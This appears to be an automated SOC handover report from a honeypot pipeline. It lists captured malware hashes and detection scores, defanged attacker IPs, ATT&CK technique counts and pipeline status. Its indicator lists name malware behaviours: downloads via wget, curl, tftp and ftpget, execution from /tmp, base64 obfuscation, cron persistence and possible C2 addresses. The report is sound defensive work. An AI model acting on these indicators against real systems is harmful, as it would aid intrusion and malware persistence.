| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 42/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **42/74** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 60/100 | 🟡 MEDIUM | 0/76 ✅ |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` | ELF Binary (Linux executable) (x86 32-bit) | `c8545034cd4fe71e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `ce3cb467257e402122e4ab5f3f40fefcbdb4a662664659672a38967ee8aaaad0` | ELF Binary (Linux executable) (x86-64 64-bit) | `ce3cb467257e4021...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` | Bash Script | `d46555af1173d22f...` | 70/100 | 🔴 HIGH | **26/75** 🔴 |
| `dbb7ebb960dc0d5a480f97ddde3a227a2d83fcaca7d37ae672e6a0a6785631e9` | ELF Binary (Linux executable) (AArch64 64-bit) | `dbb7ebb960dc0d5a...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `ea73a088909b53110444807188562c406c6c6c89b3748aee016bc996ab1f1318` | Unknown binary | `ea73a088909b5311...` | 55/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `eaf9adb4bb80316a3aafceabc0f2ed2aed7c76cf134b9b7c66226fc4f003aa97` | ELF Binary (Linux executable) (x86-64 64-bit) | `eaf9adb4bb80316a...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `f11dd1e4a3d27eef85d44154d662ce94234ee71b54468aeb2c23edb30b74a5c5` | ELF Binary (Linux executable) (x86-64 64-bit) | `f11dd1e4a3d27eef...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` (d46555af1173d22f07c37ef9...)_
- `Execution from /tmp` — `/tmp/clean_crontab`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `141.11.88[.]108` | US | Vantiva SA | **100** ⚠️ | 2 |
| `139.59.86[.]13` | IN | DigitalOcean, LLC | **100** ⚠️ | 4 |
| `111.23.129[.]238` | CN | China Mobile Communications Corporation | **100** ⚠️ | 5 |
| `92.204.138[.]191` | US | Host Europe GmbH | **100** ⚠️ | 8 |
| `72.14.178[.]148` | US | Linode | **100** ⚠️ | 50 |
| `212.8.242[.]38` | NL | WorldStream B.V. | **100** ⚠️ | 9 |
| `209.99.185[.]59` | CH | SKN Subnet & Telecom Ltd | **100** ⚠️ | 22 |
| `34.156.195[.]203` | BE | Google LLC | **100** ⚠️ | 0 |
| `139.19.117[.]129` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `85.217.149[.]69` | CA | NL MODAT | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 276 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 273 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 3 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 620 cases |
| Tool 34  | Credential Extractor        | ✅ 281 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 28 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (1.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 23 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 36 files |
| Tool 33  | YARA Classifier             | ✅ 31 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 273 priority case(s) shown individually · 20 recon entry/entries in table (11 group(s) consolidating 332 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-06-25T10:47:33Z_
